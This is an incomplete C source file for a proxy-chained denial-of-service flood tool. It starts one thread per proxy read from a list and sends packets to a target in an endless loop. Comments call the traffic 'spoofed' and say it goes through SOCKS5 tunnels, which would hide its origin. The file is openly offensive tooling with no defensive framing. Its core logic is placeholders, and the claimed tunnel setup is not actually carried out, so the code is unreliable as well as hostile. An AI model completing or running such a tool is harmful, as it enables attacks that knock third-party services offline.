#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>

// [Include checksum and pseudo_header logic from previous Apex versions]

typedef struct {
    char target_ip[16];
    int port;
    char proxy_ip[16];
    int proxy_port;
} ProxyArgs;

void *proxy_flood(void *args) {
    ProxyArgs *a = (ProxyArgs *)args;
    
    // 1. Establish SOCKS5 Tunnel
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in proxy_addr;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(a->proxy_port);
    inet_pton(AF_INET, a->proxy_ip, &proxy_addr.sin_addr);

    if (connect(s, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        pthread_exit(NULL); // Proxy failed
    }

    // 2. Start the Flood through the tunnel
    char datagram[4096];
    // ... [Insert Volumetric Payload logic from previous script here] ...

    while(1) {
        // Send our spoofed 1KB packets through the proxy tunnel
        send(s, datagram, 1024 + 40, 0);
    }
}

int main(int argc, char *argv[]) {
    // Logic to read valid_proxies.txt and launch one pthread_create per proxy
    printf("--- PROXY-CHAINED VOLUMETRIC FLOOD STARTING ---\n");
    // ... [Standard pthread loop] ...
}
